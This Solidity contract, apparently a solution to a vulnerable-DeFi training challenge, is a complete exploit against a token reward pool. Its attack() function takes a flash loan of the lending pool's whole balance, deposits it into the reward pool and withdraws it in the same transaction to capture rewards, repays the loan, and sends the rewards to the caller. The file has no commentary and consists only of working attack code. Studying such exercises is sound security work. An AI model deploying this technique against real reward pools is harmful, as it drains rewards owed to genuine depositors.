// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}


contract RewarderAttacker {

    ITheRewardPool public immutable rewardPool;
    IERC20 public immutable tokenAddress;
    IERC20 public immutable rewardToken;
    IFlashLoanerPool public immutable flashLoanPool;

    constructor(ITheRewardPool _rewardPool, IERC20 _tokenAddress, IFlashLoanerPool _flashLoanPool, IERC20 _rewardToken) {
        rewardPool = _rewardPool;
        tokenAddress = _tokenAddress;
        flashLoanPool = _flashLoanPool;
        rewardToken = _rewardToken;
    }

    function attack() external {
        uint256 flashLoanBalance = tokenAddress.balanceOf(address(flashLoanPool));
        tokenAddress.approve(address(rewardPool), flashLoanBalance);
        flashLoanPool.flashLoan(flashLoanBalance);
        require(rewardToken.balanceOf(address(this)) > 0, "reward balance was 0");
        bool success =
            rewardToken.transfer(
                msg.sender,
                rewardToken.balanceOf(address(this))
            );
        require(success, "reward transfer failed");
    }

    function receiveFlashLoan(uint256 amount) external {
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        tokenAddress.transfer(address(flashLoanPool), amount);
    }   
}